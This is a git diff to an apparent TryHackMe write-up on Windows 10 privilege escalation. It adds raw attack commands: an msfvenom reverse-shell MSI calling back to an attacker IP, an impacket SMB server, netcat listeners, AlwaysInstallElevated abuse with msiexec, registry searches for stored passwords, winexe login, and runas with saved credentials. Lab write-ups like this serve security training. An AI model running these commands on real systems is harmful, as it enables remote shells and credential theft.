@@ -212,7 +212,7 @@ And lastly we run the service to esecute our reverse shell.
 net start regsvc
 ```
 
-![Reverse Shell Connection]()
+![Reverse Shell Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Weak_Registry_Reverse_Connection.png)
 
 ### Service Exploits - Insecure Service Executables
 
@@ -297,12 +297,24 @@ nc -nlvp 1337
 ### Registry - AlwaysInstallElevated
 
 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f msi -o reverse.msi
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 
+nc -nlvp 1337
+
+copy \\10.18.78.136\kali\reverse.msi "C:\PrivEsc\reverse.ms
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
 Read and follow along with the above.
 
 ### Passwords - Registry
 
+
+reg query /f password  /t REG_SZ
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+winexe -U 'admin%password123' //10.10.6.194 cmd.exe
 
 
 1. What was the admin password you found in the registry?
@@ -313,7 +325,8 @@ Read and follow along with the above.
 
 ### Passwords - Saved Creds
 
-
+cmdkey /list
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
 
 Read and follow along with the above.
 
